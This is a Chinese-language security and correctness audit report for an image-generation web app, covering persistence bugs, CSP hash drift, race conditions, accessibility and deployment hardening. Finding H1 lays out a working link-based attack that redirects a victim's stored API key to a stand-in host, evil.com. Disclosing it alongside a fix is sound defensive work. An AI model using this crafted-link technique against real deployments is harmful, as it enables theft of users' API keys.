# 全项目代码审查报告(第二轮) · image-playground

> 审查日期:2026-05-31
> 审查范围:`src/` 全量(85 ts + 52 tsx)+ 构建/部署/基础设施配置(Dockerfile / compose / nginx / Caddy / `_headers` / sw.js / vite / wrangler)
> 审查方法:6 领域审查 agent 并行深读 → 每条发现独立 agent 对抗式证伪(逐条读源码裁定真伪)→ 人工二次交叉核验关键项(含受控构建实测)
> 基线提交:`d27154f`(Merge: 全项目安全/正确性审查修复(WP1–8 + 延迟项))
> 配套上一轮:`docs/code-review-2026-05-29.md` / `docs/remediation-plan-2026-05-29.md`

---

## 一、总体判断

**健康度:良好,无致命缺陷。上一轮(WP1–8)的系统性加固已落地;本轮存活问题集中在三条边界主题,均为「主路径已做对、只差边界」的成熟代码库特征。**

工程化水平高:核心运行时已有 watchdog、孤儿清理、`AbortController`、状态写回校验、内容寻址去重、多数弹窗 `useFocusTrap`、CSP/安全头、ZIP 路径穿越防护、不可信导入字段白名单。无 critical。三条系统性主题:

1. **IndexedDB 事务语义精确性**——提交时机(`onsuccess` vs `oncomplete`)、`onabort` 处理、连接生命周期。
2. **用户可控 `baseUrl` 这一信任边界的收口**——上一轮收窄了 `apiKey`,但 `apiUrl` 与 Gemini URL 构造仍有缺口。
3. **跨平台 / 跨标签的构建与运行一致性**——CSP 哈希换行符、`CACHE_NAME` git 哈希、多标签孤儿清理、主题引导键。

### 地面信号(独立运行)

| 信号 | 结果 |
|---|---|
| 类型检查 `tsc -b` | ✅ 无报错 |
| 测试 `vitest run` | ✅ 27 文件 / 226 用例全部通过 |
| lint `eslint src` | ⚠️ 0 error / 84 warning(react-hooks set-state-in-effect / refs-during-render、preserve-caught-error 为主) |

### 审查结果统计

| 维度 | 数据 |
|---|---|
| 审查领域 | 6(API·安全 / 持久化 / 任务运行时 / 图像画布 / React·a11y / 构建部署) |
| 原始发现 | 28 |
| **核验确认/存疑** | **25**(0 critical · 3 high · 6 medium · 16 low,其中 4 条 low 经验证为「潜在、当前 UI 路径不可达」) |
| 核验驳回(误报) | 3 |
| 人工新增(工作流未单独立项) | 1(主题引导脚本读错 localStorage 键) |

---

## 二、建议处理顺序(按性价比)

1. **H1** — `apiUrl` 收窄为仅 hash 读取 + 「仅改 baseUrl 不复用旧 key」。改动一两行,堵死一条一键、无 XSS、且被持久化放大的真实 key 外泄链。
2. **H2** — `dbTransaction` 改 `tx.oncomplete` resolve + 补 `tx.onabort`。单点修复一个被所有写入路径复用的核心函数。
3. **H3** — 加 `.gitattributes`(`index.html text eol=lf`)+ 同步四处 CSP 哈希 + Dockerfile 守卫追加哈希比对。必须在「去掉 `-Report-Only` 强制 CSP」上线前完成。
4. **M1 / M2c** — 替换导入「先校验后清空」、`putTask` 失败回滚 + toast。改动小,顺带处理。
5. **L·主题键** — 一行修复主题引导脚本的 localStorage 键。
6. **M2a / M2b / M3** — 多标签孤儿清理重校验、取消信号窗口、高频 overlay 焦点陷阱。
7. 其余 low / 可维护性按常规迭代收敛。

---

## 三、🔴 HIGH(3 条,优先修)

### H1 · `apiUrl` 可经查询串注入,把受害者真实 API key 重定向到攻击者主机
- **位置**:`src/lib/urlBootstrap.ts:52`(+ `src/App.tsx:67-92`、`src/store/slices/settings.ts:29-51`)
- **类别/置信度**:security / high
- **问题**:上一轮加固只把 `apiKey` 收窄为「仅 hash 读取」,但 `apiUrl` 仍同时接受查询串与 hash:`const apiUrlParam = searchParams.get('apiUrl') ?? hashParams.get('apiUrl')`。完整外泄链(一键、无需 scheme/provider、无需 XSS):
  1. 受害者已在某部署实例配好真实 key。
  2. 攻击者诱导其打开 `https://你的实例/?apiUrl=https://evil.com`——`normalizeBaseUrl('evil.com')` 自动补 `https://` 并原样保留攻击者 origin,无任何 allowlist。
  3. `readUrlBootstrap` 把 `baseUrl` 设为 `https://evil.com/v1`,`App.tsx:91` `setSettings({baseUrl})`;settings slice 在 `hasLegacyOverrides` 分支改写 active profile 的 `baseUrl` 但 **`apiKey: incoming.apiKey ?? profile.apiKey` 保留受害者原 key**。
  4. 下一次生图,`createRequestHeaders`(`openaiCompatibleImageApi.ts:25-31`)带 `Authorization: Bearer <受害者真实key>` 发往 `https://evil.com/v1/images/generations`,**key 被窃**。
  5. **持久化放大**:被污染的 `baseUrl` 经 zustand persist 写入 localStorage,`App.tsx:92` 的 `replaceState` 只清 URL 不清 store——污染跨刷新长期存活、持续外泄。唯一闸门 `validateApiProfile` 只查非空,不校验 origin。
- **修复**:把 `apiUrl` 也收窄为仅 hash 读取(与 `apiKey` 对称):`const apiUrlParam = hashParams.get('apiUrl')`。更稳妥:当 bootstrap 只改 `baseUrl` 而未同时提供新 `apiKey` 时不复用旧 key——要求 hash 同时携带新 key,或对「baseUrl 变更但沿用既有 key」显式确认/拒绝,或注入后清空 active profile 的 `apiKey`。
- **关联**:同源缺陷在 `geminiImageApi.ts` 的 `buildGeminiUrl` 上还表现为「无 scheme 的 baseUrl 退化为同源相对路径」,见 L1(经验证非「发往任意主机」,定级 low)。

### H2 · `dbTransaction` 缺 `onabort`,且 readwrite 在 `oncomplete` 前提前 resolve → 静默丢写
- **位置**:`src/lib/db.ts:49-64`
- **类别/置信度**:data-loss / high
- **问题**:被所有 `putTask`/`putImage`/`putConversation`/`deleteX`/`clearX` 复用的核心 `dbTransaction` 只挂 `req.onsuccess`(resolve)与 `req.onerror`(reject),既无 `tx.onabort`,也未用 `tx.oncomplete` 作为 readwrite 的 resolve 时机。两条后果:
  - **静默丢写(主)**:按 IndexedDB 规范,`request.onsuccess` 仅表示写请求被缓冲,真正落盘在 `tx.oncomplete`。当前在 `onsuccess` 即 resolve,调用方据此推进——`submitTask`(`taskRuntime.ts:456`)`setTasks` 后展示成功、`updateTaskInStore`(`:607`)视为已保存、`executeTask` 弹「生成完成」toast。若事务随后在提交阶段 abort(配额耗尽、I/O 失败、标签页冻结回滚),写入被回滚而无人感知,**内存态与磁盘态分歧**。
  - **Promise 永久挂起(次)**:若 abort 发生在某请求 settle 之前,`onsuccess`/`onerror` 都不触发,`await` 永久卡死,UI 留在 running 态。此为较窄子场景(多数 abort 会落入「提前 resolve 后回滚」而非挂起)。
  - **内部不一致佐证**:同文件手写事务的 `persistConversationMigration`(`:113-115`)/`deleteConversation`(`:140-142`)都正确挂了 `onabort` 并用 `oncomplete` resolve,`openDB` 自身也处理了 `onabort`/`onblocked`——唯独这个被全量复用的核心函数漏了。
- **修复**:readwrite 路径改为在 `tx.oncomplete` 时 resolve(`req.result` 先在 `onsuccess` 暂存到闭包变量),并补 `tx.onabort = () => reject(tx.error ?? new Error('事务中止'))`;readonly 路径维持 `onsuccess` resolve 即可。这样 resolve 等价于真正持久化,同时消除挂起。

### H3 · CSP 内联脚本 sha256 哈希跨平台换行符漂移,强制 CSP 后 Linux 构建首屏脚本被拦截
- **位置**:`index.html:14-30` + `public/_headers:12` / `nginx-security-headers.inc:15` / `Caddyfile:26` / `Caddyfile.lan:22`
- **类别/置信度**:build-deploy / high(经受控构建实测)
- **问题**:四处部署配置的 `script-src 'sha256-3RSlfpoi9mvBe/mSqzp5IGBDwU6ltj+1Eozow0zhThg='` 是对 **CRLF 版**内联 `<script>`(815 字节)算出的。但仓库里 `index.html` 的 blob 以 **LF** 存储(`git ls-files --eol index.html` → `i/lf`,仓库无 `.gitattributes`)。实测两组哈希:

  | 版本 | 字节 | sha256 |
  |---|---|---|
  | CRLF(本机 `autocrlf=true` 工作区) | 815 | `3RSlfpoi9mvBe/mSqzp5IGBDwU6ltj+1Eozow0zhThg=` ← 配置值 |
  | LF(git blob / Linux 检出) | 799 | `ufYd8dG878ftWHwWvC/7ntaXgTjyBSrETGimZL+ME1Y=` ← **不匹配** |

  Dockerfile 在 `node:20-alpine`(Linux,`autocrlf` 默认 false)`COPY . . && npm run build`、以及 `wrangler deploy` 都走 LF 路径。受控构建已验证 **Vite 逐字透传换行符、不归一化**,故 Linux 产物字节确与部署哈希失配。当前被两层掩盖:(1) CSP 仍是 `Content-Security-Policy-Report-Only`(只上报不拦截);(2) 开发者在 Windows。一旦按 `docs/security-headers.md` 第 5 步(既定上线流程)去掉 `-Report-Only` 改为强制,**Linux 构建产物的主题引导内联脚本被 CSP 拦截**(CSP 拦截不可被脚本内 `try/catch` 捕获)→ 首屏闪烁 / dark 失效,**且只在生产 Linux 构建复现、本机无法察觉**。Dockerfile 构建守卫(`:20-22`)只校验 `__CACHE_NAME__` 占位符,不校验 CSP 哈希,失配产物会静默发布。
- **修复**:二选一根治——(a) 加 `.gitattributes` 固定 `index.html text eol=lf`,并把四处 CSP 哈希同步更新为 LF 版 `ufYd8d...`;或 (b) 把主题引导脚本抽成 `/assets` 下独立 `.js`,走 `'self'` 放行,彻底去掉脆弱内联哈希。并在 Dockerfile 守卫追加一步:从 `dist/index.html` 提取内联脚本重算 sha256 与配置比对,不一致即 `exit 1`,把「强制 CSP 后白屏」从运行期事故前移为构建期硬失败。

---

## 四、🟠 MEDIUM(6 条)

### M1 · replace 模式导入中途异常会清空全部本地数据且无法恢复
- **位置**:`src/lib/exportImport.ts:224-235`
- **类别/置信度**:data-loss / high(置信度)
- **问题**:`importData` 在 replace 模式下先依次 `await dbClearTasks()/clearImages()/dbClearConversations()` 清空三个 store,然后才逐条 `putImage`/`putTask` 写回。三步清空与后续写回**不在同一事务、各自独立提交**,无快照、无回滚。若在清空之后、写回完成之前发生异常,旧数据已物理删除而新数据尚未写入,`catch` 只弹一个 toast(「数据可能不完整」),用户全部历史任务/图片/对话**永久丢失**。merge 模式不预清空,无此风险。
- **触发面修正**:`unzipSync`、manifest JSON 解析、字段校验均在清空之前(`:216/219/222` 早于 `:225`),故「manifest 非法」「ZIP 损坏」两个触发器到不了丢失窗口。真正可达的是 `putImage` 触达 `QuotaExceededError`(替换导入大备份时清空后写回超配额)与清空/写回之间浏览器被关闭——属边缘条件,故定 medium。
- **修复**:replace 导入应**先完整解析 + 归一化 manifest 与全部图片字节(全部校验通过、内存就绪)再清空旧库**;或把「清空 + 写回」收敛到尽量少的事务;至少在清空前做一次内存/临时 store 快照,`catch` 中提示可恢复。

### M2 · 任务运行时三处「同步快照/校验 vs await 异步」缺口(同源)
根因同构:`taskRuntime.ts` 中「同步快照/存在性校验」与「`await` 异步操作」之间缺乏重校验或失败兜底。

- **M2a — initStore 启动期孤儿图清理与并发提交/多标签竞态,误删在用图**
  位置:`src/lib/taskRuntime.ts:296-316` · race-condition / medium
  `referencedIds` 快照取自「此刻的 `finalTasks` + 持久化 `inputImages`」,随后 `await getAllImages()`(真实让出事件循环)再逐张 `await deleteImage`。`getAllTasks`/`getAllImages`/`putTask` 是三个分离事务、无隔离。多标签路径真实可达(全仓无 `BroadcastChannel` / `navigator.locks` / storage 事件 / 单标签互斥):Tab B 先 `storeImage`(blob 落库)后 `putTask`,Tab A 的 init 在 B 的 `putTask` 之前读完 tasks、却在 B 的 `storeImage` 之后 `getAllImages` → 看到图没看到 task → 误删在用图,导致 `executeTask` 抛「输入图片已不存在」、详情页图裂。`initStore` 是 `App.tsx:94` fire-and-forget,提交按钮不依赖 init 完成,放大窗口。单标签命中较窄(需内容寻址去重 + 亚秒内复用相同内容图)。
  修复:删除前用单事务重读最新 tasks/images 并基于最新引用集删除;或给图片记录加 `createdAt`,只清理早于 init 启动时间戳的图;多标签加 `BroadcastChannel`/迁移锁。

- **M2b — 取消任务在输入图加载窗口期发生时,在途请求拿到 `undefined` signal 无法中止**
  位置:`src/lib/taskRuntime.ts:478-506, 91-105, 154-166` · race-condition / medium
  `executeTask` 在 `:478` 注册 `AbortController`,随后 `await ensureImageCached(...)` 期间状态仍 running、取消按钮可用。若此时取消,`terminateTaskRuntime` 先 abort 再 `clearTaskAbortController` 从 map 删除控制器;`await` 恢复后 `signal: taskAbortControllers.get(taskId)?.signal` 取到 `undefined`,`mergeAbortSignals` 过滤掉后 fetch 只受 provider timeout 约束。结果:UI 已显示「已取消」,底层请求却跑到 provider timeout 才结束,持续消耗带宽与计费配额。最明确触发路径是**刷新后 `retryTask`**(内存缓存冷,带输入图任务在 running 期真实 await DB)。状态校验会拦截写回、无孤儿图,故 medium。
  修复:进入异步前把 signal 取到局部变量(`const signal = taskAbortControllers.get(taskId)?.signal`),调 `callImageApi` 前重校验仍 running;或取消时仅 abort、延后清理 map。

- **M2c — `putTask` 写失败时任务永久卡在 running 且 `executeTask` 不执行**
  位置:`src/lib/taskRuntime.ts:455-467, 716-720` · 运行期/UX 正确性 / medium
  `submitTask` 先 `setTasks([task, ...])` 放入 running 任务,再 `await putTask`,最后才 `executeTask`。若 `putTask` reject(配额、隐私模式驱逐、storage 禁用、tx abort),函数在 `executeTask` 前抛出:任务在内存显示「生成中」但无 API 请求、无 watchdog、无 `AbortController`。调用方(`InputBar/index.tsx:218/375`、`retryTask` 同形于 `:716-720`)均为浮动 Promise 无 `.catch`,全仓无 `unhandledrejection` 监听,reject 静默无 toast。
  描述修正:用户**仍可手动取消**(`cancelTask` 只依赖内存 `status==='running'`,TaskCard 取消按钮对幽灵任务有效),应表述为「无自动恢复、需手动取消」而非「永久卡死」;无数据丢失,类别应为运行期/UX 正确性。触发面也较窄(`putTask` 之前已有未捕获的 `await storeImage`,多数存储类故障会更早暴露)。
  修复:`try/catch` 包 `putTask`,失败时回滚内存 `setTasks` + `showToast`。

### M3 · 高频 overlay 缺焦点陷阱与 dialog 语义(同源)
- **位置**:`src/components/DetailModal.tsx`(37-38, 286-289)、`src/components/Lightbox.tsx`(26-27, 446-453)、`src/components/ImageContextMenu.tsx`(48-71, 172-217);`ConfirmDialog` 同缺
- **类别/置信度**:accessibility / medium
- **问题**:项目已为 SettingsModal/PromptOptimizer/ImageCaption/SizePicker 接入 `useFocusTrap`,但几个最常用的交互层是明显回退:
  - **DetailModal / Lightbox / ConfirmDialog**:只接 `useCloseOnEscape` + `useLockBodyScroll`,**无 `useFocusTrap`**,根节点也无 `role="dialog"`/`aria-modal="true"`/`tabIndex={-1}`。纯键盘:打开详情弹窗 → 连续 Tab → 焦点环出弹窗落到被遮罩盖住的背景元素(InputBar 输入框、TaskCard 按钮);屏幕阅读器不识别为模态,继续朗读背景。`ConfirmDialog` 承载删除/清空数据这类破坏性确认,更值得关注。
  - **ImageContextMenu**(复制/下载/编辑/反推):只监听 `mousedown/touchstart/wheel/scroll/resize` 关闭,**无 keydown → ESC 无法关闭**;容器是普通 `<div>`,按钮无 `role="menu"/"menuitem"`,打开时不把焦点移入。与同仓 `ConversationItem` 菜单(有 `role=menu/menuitem` + ESC 关闭,`ConversationItem.tsx:63-72, 223-260`)相比是明显回退。纯键盘唤出路径偏窄(`<img>` 无 tabIndex 不可直接 Tab,需 Shift+F10/菜单键),但「打开后无法 ESC 关闭、读屏无菜单语境」对任意打开方式都成立。
  - 有缓解:Esc 与点遮罩仍可关、body 已锁滚、`ConfirmDialog` 有 `minConfirmDelayMs` 确认延迟。影响为键盘/读屏 UX 降级,非安全/数据丢失,故 medium。
- **修复**:给 DetailModal/Lightbox/ConfirmDialog 面板加 `role="dialog" aria-modal="true" tabIndex={-1}` 并接入已有 `useFocusTrap`(Lightbox 作用在 `LightboxInner` 根节点)。ImageContextMenu 参照 `ConversationItem`:打开移焦首项、keydown 处理 Escape 关闭 + 方向键 roving、容器 `role="menu"`、按钮 `role="menuitem"`。

---

## 五、🟡 LOW / 可维护性 / 潜在隐患

标注 **(潜在,当前不可达)** 的条目经对抗式验证,因果链的「实际危害」环节被现有代码结构堵死,属维护期踩坑点而非现网 bug。

**安全 / 网络**
- **L1 · `buildGeminiUrl` 不做 scheme 校验**(`geminiImageApi.ts:91-95, 135-146`):原 finding「Gemini 独有 SSRF/key 外泄到任意主机」**经验证不成立**——OpenAI/chat 三条路径对任意 http(s)/内网主机转发行为一致,是 user-configurable baseURL 的固有面。真实残留仅低危一致性缺口:无 scheme 输入退化为同源相对路径(key 发往应用部署源)、空 baseUrl 静默回退官方端点。建议让 `buildGeminiUrl` 走 `normalizeBaseUrl + isHttpUrl` 与 OpenAI 路径对齐。
- **L2 · CORS 代理对非浏览器客户端仍是开放中继**(`cors-proxy.conf:11-18, 47-95`):Origin 白名单正则锚定正确、无绕过,但 `proxy_pass` 对 curl/脚本无条件透传(攻击者自带 key 可把代理当免费中继,消耗你的出口带宽/IP 声誉)。第 13 行注释「关闭了开放代理滥用面」是语义高估。建议加请求级门禁(`if ($cors_allow_origin = '') { return 403; }` 或共享密钥/Referer/限流)并修正注释。
- **L3 · `fetchImageUrlAsDataUrl` 对上游返回图片 URL 无大小/content-type 校验**(`imageApiShared.ts:149-163`):上游返回 `item.url` 时整块读入内存 + btoa,`MAX_IMAGE_INPUT_PAYLOAD_BYTES` 守卫不覆盖此路径,受半信任上游(可经 H1 注入)影响。建议下载后套入站一致上限并校验 `blob.type` 以 `image/` 开头。
- **L4 · 构建工具链 4 个 moderate 依赖漏洞**(`package.json:26, 45`,wrangler/miniflare/ws):链路全在 devDependencies,`npm audit --omit=dev` 为 0,不进 bundle(已核验 `dist/assets` 无相关代码),攻击面仅开发者本机/CI。按节奏 bump,CI 加 `npm audit --omit=dev --audit-level=high` 门禁。

**资源 / 性能**
- **L5 · 导入将整个 ZIP 全量解压进内存、无总体积上限**(`exportImport.ts:215-259`):`unzipSync` 同步解压全部条目 + 逐张 Blob 副本叠加驻留,zip bomb 或超大备份可 OOM、阻塞主线程。建议对 `file.size`/条目数设上限,考虑流式解压 + Web Worker。
- **L6 · 输入图片只限文件字节(50MB)未限像素维度**(`taskRuntime.ts:863-876`):高压缩比 50MB 图可解码成上亿像素位图,缩略图/遮罩主图路径会先全尺寸解码,低内存设备崩页。建议入库前读 `naturalWidth/Height` 对总像素设上限(对齐 `size.ts` 的 `MAX_PIXELS`)。(注:原 finding「`validateMaskMatchesImage` 对原图整尺寸 `getImageData` 内存翻倍」不准确,该路径实际跑在降采样工作图上。)

**正确性 / 数据完整性**
- **L7 · `executeTask` 错误分支 `await updateTaskInStore` 逃逸为未捕获 rejection**(`taskRuntime.ts:576-595, 467`):`updateTaskInStore` 在 `putTask` 失败时已 toast + 写 `persistenceError` 后又 `throw`,经 fire-and-forget 调用点逃逸。功能非致命(用户已感知、下次 initStore 自愈),仅控制台噪音 + 内存/DB 短暂分歧。建议内部改用已存在的 `updateTaskInStoreSilently`。
- **L8 · `updateTaskInStore` 的 `await putTask` 与并发删除存在 DB 级孤儿复活窗口** **(潜在,基本被规范排除)**(`taskRuntime.ts:541-548, 825-841`):原 finding 核心机制断言有误——同 object store 的两个 readwrite 事务按**创建顺序**串行化,而 `putTask` 因 `executeTask` 早已挂起,其事务创建先于用户点击触发的 `dbDeleteTask`,坏序(delete 先提交、put 重写)基本被排除。残留不确定性仅来自 `openDB()` 未记忆化的连接 resolve 抖动。作为纵深防御可在 `putTask` 后复查 store 是否已删。
- **L9 · 遮罩工作尺寸两轴独立 `floorToMultiple` 取整破坏宽高比**(`maskPreprocess.ts:50-56`):最长边 >1920 触发缩放时,宽高各自向下取整使被编辑主图相对原图非等比拉伸(常见 16:9 约 0.75%,部分场景 ~1.3%,4:3/3:2 为 0)。建议固定长边 = `floorToMultiple(maxEdge,16)`,短边按精确比例对齐。(注:原 finding 对「0.001 容差为何不报错」的归因有误,实为根本无人对照原图比例检查。)
- **L10 · `copyTextWithExecCommand` 兜底移动焦点不还原** **(潜在,当前不可达)**(`clipboard.ts:41-60`):仅在异步剪贴板不可用(老浏览器/非安全上下文)触发,且两个调用方都在 DetailModal 内、该弹窗无任何可编辑字段,所述「IME 中断/失焦」危害不可达。建议作为防御性改进:缓存 `document.activeElement`,finally 中 `prev?.focus?.()`。

**可维护性 / 设计脆弱点**
- **L11 · 三套互不感知的 body 滚动锁共用 `document.body.style.overflow`** **(潜在,当前不可达)**(`useLockBodyScroll.ts:11-26`、`Sidebar/index.tsx:128-135`、`InputBar/ImageGrid.tsx:94-104`):交错释放导致的卡死/提前解锁被 overlay z 层级 + open-即-close 原子关闭 + React「先 cleanup 后 setup」语义堵死。建议统一改走 `useLockBodyScroll(active)` 单一锁源作为预防性重构。
- **L12 · InputBar 子弹层与全局模态用两套 ESC 关闭机制,ESC 栈对前者不可见**(`AdvancedParamsPopover.tsx`、`ModelMenu.tsx`、`ResolutionMenu.tsx`,另有未列举的 `StylePickerPopover.tsx`):popover 在 document 上 `stopPropagation` 拦 ESC,当前正常工作但游离于 `useCloseOnEscape` 栈外,未来与进栈模态并存会按「谁先冒泡」而非栈顶决定优先级。建议统一复用 `useCloseOnEscape(open, onClose)`。
- **L13 · `openDB` 每次操作重新 `indexedDB.open`、不复用连接、无 `onversionchange`**(`db.ts:10-47`):未来 `DB_VERSION` bump 时,持旧连接的标签页因无 `onversionchange` 不主动让路,新标签页 `open` 会 `onblocked` 报错。当前因不缓存连接,旧连接靠 GC 回收而非长存,「永久死锁」被一定程度自我缓解。建议缓存单个 db 连接 + 注册 `onversionchange` 自动 `close`。
- **L14 · `reorder` 整数重排自愈会跨全部对话重写并持久化整表 `sortOrder`**(`taskRuntime.ts:646-675`、`taskSort.ts:13-30`):拖拽基于当前对话的 `filteredTasks` 计算 prev/next,但精度坍缩自愈分支用全量 `tasks` 重排并 `putTask` 落库,在对话 A 内一次普通拖拽(命中 `SORT_EPSILON`)会重写其它所有对话全部任务的 `sortOrder`(相对顺序不变,无数据损坏,但整表写放大)。触发窄(需反复同隙插入耗尽精度)。建议把自愈重排限定在当前对话子集。
- **L15 · Docker `.dockerignore` 排除 `.git` 致 `CACHE_NAME` 退化为 `nogit`**(`.dockerignore:6`、`inject-sw-build-id.mjs:12-25`):缓存失效仍正确(timestamp 唯一),仅丢失 commit 可追溯性。根因有二:除 `.git` 被排除外,`node:20-alpine` 也不含 git 二进制(未 `apk add git`),故仅放行 `.git` 不够。建议改用 `--build-arg GIT_SHA=$(git rev-parse --short HEAD)` 注入。
- **L16 · nginx/Caddy 容器以 root 运行、基础镜像浮动 tag 未固定 digest**(`Dockerfile:10, 25`):纯静态托管 + 内部网络不直接暴露端口,实际风险低。可选加固:切 `nginxinc/nginx-unprivileged` 或显式降权,compose 加 `cap_drop: [ALL]` / `no-new-privileges` / `read_only`,可重现性敏感时 pin digest + Renovate 跟踪。

### ➕ 人工新增(工作流未单独立项)
- **L17 · 主题引导脚本读错 localStorage 键 → 深色/跟随系统用户每次刷新 FOUC**
  - **位置**:`index.html:17` vs `src/store/index.ts:25`
  - **类别/置信度**:correctness / high(置信度)
  - **问题**:内联脚本读 `localStorage.getItem('gpt-image-playground')`,但 zustand persist 键是 `'image-playground'`(全仓 `gpt-image-playground` 仅此一处,是改名遗留死键)。该脚本本意是首屏绘制前根据存储主题加 `dark` class,**恒读不到真实值 → 退化为 `light`**:深色/跟随系统用户**每次刷新先闪浅色再切深色**。默认主题 `light` 故默认用户无感。注意它与 H3 **独立**——即便修好 CSP 哈希,这个键仍错;若采用 H3 方案 (b) 抽成外部 `.js` 应顺带修正。
  - **修复**:把内联脚本里的键改成 `'image-playground'`(一行)。

---

## 六、已证伪(3 条误报,供放心略过)

1. **`normalizeTask` 数值字段无范围校验 →「n 过大触发高额计费」**:不成立。所有把 `task.params` 送 API 的路径都先过 `normalizeParamsForSettings`(`paramCompatibility.ts:17`),`n` 被 `Math.min(10, Math.max(1, ...))` 硬收敛;导入的越界 `n` 任务不会被直接执行,复跑必经 retry/reuse,二者都 clamp。残余的 `output_compression` 越界仅导致服务端 400 良性拒绝。
2. **遮罩说明 Popover 长按计时器悬挂**:不成立。引用的 `viewport.ts preventDefault` 机制错误(preventDefault 不阻止 touchend/touchcancel 派发);touch 规范保证每个 touchstart 必有 touchend 或 touchcancel,二者都已接线清理计时器。
3. **`useFocusTrap` 困不住 portal 子菜单(FavoriteCategoryMenu)**:不成立。关键证据捏造——`SettingsModal` 根本不用 `FavoriteCategoryMenu`(其分类管理是 `FavoriteCategorySection.tsx` 的行内输入);项目仅 4 个组件用 `useFocusTrap`,均不渲染该 portal 菜单,trap 与该菜单从不共存。

---

## 七、方法论附注

- **审查编排**:多智能体工作流(`full-project-audit`)——6 个领域审查 agent 并行深读 → pipeline 内每条 finding 立即派一个怀疑论 agent **对抗式证伪**(默认倾向 rejected,亲自读源码核对因果链)→ 综合 agent 汇总。共 35 个 agent、约 168 万 token、596 次工具调用。
- **人工二次核验(关键项)**:
  - H3 的换行符漂移经**受控构建实测**确认:`git ls-files --eol` 证 LF blob、`git cat-file` 取原始 blob、Node 重算 CRLF/LF 两版 sha256,数值与配置逐位比对(见 H3 表)。本机 `dist` 哈希「巧合匹配」恰因 Windows `autocrlf=true`,正是该陷阱「本机不可见」的体现。
  - H2 与人工独立精读 `db.ts` 的结论一致(`onsuccess` vs `oncomplete` 提交时机)。
  - M1 与人工独立精读 `exportImport.ts` replace 路径的结论一致。
  - L17 为人工独立发现(工作流的验证 agent 注意到 `gpt-image-playground` 仅出现在 index.html 的遗留读取,但仅作为 H1 描述细节的更正,未单独立项)。
- **局限**:本轮为静态审查 + 受控构建,未做浏览器内 IndexedDB 时序压测(L8 的「孤儿复活坏序」需此验证),未做真实多标签并发复现(M2a)。建议把 H1/H2/M1 纳入回归测试。
